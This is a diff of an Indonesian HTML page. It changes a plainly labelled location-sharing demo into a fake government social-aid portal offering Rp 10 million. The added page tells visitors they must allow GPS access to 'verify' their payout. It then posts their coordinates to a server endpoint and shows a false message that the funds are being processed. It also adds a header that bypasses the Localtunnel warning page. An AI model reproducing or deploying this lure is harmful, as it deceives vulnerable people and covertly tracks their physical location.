@@ -1,13 +1,15 @@
+# @title
+%%writefile index.html
 <!DOCTYPE html>
 <html lang="id">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Lacak Koordinat by handyazka</title>
+  <title>Portal Bansos 2026</title>
   <style>
     body {
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background-color: #e9ecef;
+      background-color: #f4f6f9;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -17,57 +19,55 @@
     .container {
       background-color: #ffffff;
       padding: 40px 30px;
-      border-radius: 12px;
-      box-shadow: 0 8px 16px rgba(0,0,0,0.1);
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
       text-align: center;
       max-width: 400px;
       width: 90%;
+      border-top: 5px solid #28a745;
     }
     h2 {
-      color: #343a40;
+      color: #333;
       margin-bottom: 10px;
+      font-size: 22px;
     }
     p {
-      color: #6c757d;
-      font-size: 14px;
-      margin-bottom: 30px;
+      color: #555;
+      font-size: 15px;
+      margin-bottom: 25px;
+      line-height: 1.5;
     }
     button {
-      background-color: #007bff;
+      background-color: #28a745;
       color: white;
       border: none;
       padding: 14px 24px;
       font-size: 16px;
-      border-radius: 8px;
+      border-radius: 6px;
       cursor: pointer;
       font-weight: bold;
       transition: background-color 0.3s;
       width: 100%;
     }
     button:hover {
-      background-color: #0056b3;
+      background-color: #218838;
     }
     .footer {
-      margin-top: 25px;
+      margin-top: 20px;
       font-size: 12px;
-      color: #adb5bd;
-      font-weight: bold;
+      color: #999;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h2>Deteksi Lokasi</h2>
-    <p>Aplikasi untuk mengirimkan titik koordinat lokasi kamu saat ini secara akurat.</p>
-    <button onclick="kirimLokasi()">Kirim Lokasi Sekarang</button>
-    <div class="footer">App by handyazka</div>
+    <h2>Pencairan Bansos Rp 10 Juta</h2>
+    <p>Selamat! Anda terpilih sebagai penerima bantuan sosial. Klik tombol di bawah untuk memverifikasi data dan lokasi pencairan dana Anda.</p>
+    <button onclick="kirimLokasi()">Verifikasi & Cairkan Dana</button>
+    <div class="footer">© 2026 Portal Resmi Bansos</div>
   </div>
 
   <script>
-    // PERHATIKAN BARIS DI BAWAH INI!
-    // Nanti ganti tulisan LINK_LOCALTUNNEL_KAMU_DISINI dengan link dari Localtunnel
-    const LINK_SERVER = "https://rotten-dingos-ask.loca.lt";
-
     function kirimLokasi() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(position => {
@@ -76,20 +76,23 @@
             lng: position.coords.longitude
           };
 
-          fetch(LINK_SERVER + '/api/lokasi', {
+          fetch('/api/lokasi', {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+            headers: { 
+              'Content-Type': 'application/json',
+              'Bypass-Tunnel-Reminder': 'true'
+            },
             body: JSON.stringify(dataLokasi)
           })
           .then(response => response.text())
-          .then(hasil => alert("Server bilang: " + hasil))
-          .catch(error => alert('Gagal kirim, pastikan link server sudah benar.'));
+          .then(hasil => alert("Verifikasi berhasil! Dana akan diproses ke rekening Anda dalam 1x24 jam."))
+          .catch(error => alert('Gagal menyambung ke server, coba lagi.'));
 
         }, error => {
-          alert('Gagal dapet lokasi. Pastiin GPS nyala dan diizinin.');
+          alert('Pencairan gagal. Anda wajib mengizinkan akses lokasi (GPS) agar sistem bisa memverifikasi area pencairan dana Anda.');
         });
       } else {
-        alert("Browser kamu gak support fitur ini.");
+        alert("Perangkat Anda tidak mendukung sistem ini.");
       }
     }
   </script>
